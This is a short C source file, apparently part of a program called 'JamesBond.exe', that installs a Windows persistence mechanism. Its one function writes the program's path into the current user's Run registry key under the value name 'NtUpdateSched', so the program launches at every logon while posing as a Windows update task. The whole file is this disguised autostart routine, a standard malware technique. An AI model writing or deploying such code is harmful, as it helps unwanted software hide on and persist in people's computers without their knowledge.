
#include "registry.h"

/**
 * Given the path to our JamesBond.exe as well as the argument, generate a new regsitry key under
 * the CURRENT_USER root key, targeting the \run subkey!
 */
ERR_CODE generateRegKey(char* path, char* arg, LONG access) {
    char exec[128];
    snprintf(exec, 128, "\"%s\" %s", path, arg);

    HKEY hKey;
    // now try generate the key using CURRENT_USER targeting the run key
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_DIR, 0, access, &hKey);
    if (res == ERROR_SUCCESS) {
        res = RegSetValueExA(hKey, "NtUpdateSched", 0, REG_SZ, (LPBYTE) exec, strlen(exec));
        RegCloseKey(hKey);
        if (res == ERROR_SUCCESS) { return ECODE_SUCCESS; }
    }
    return ECODE_FAILURE;
}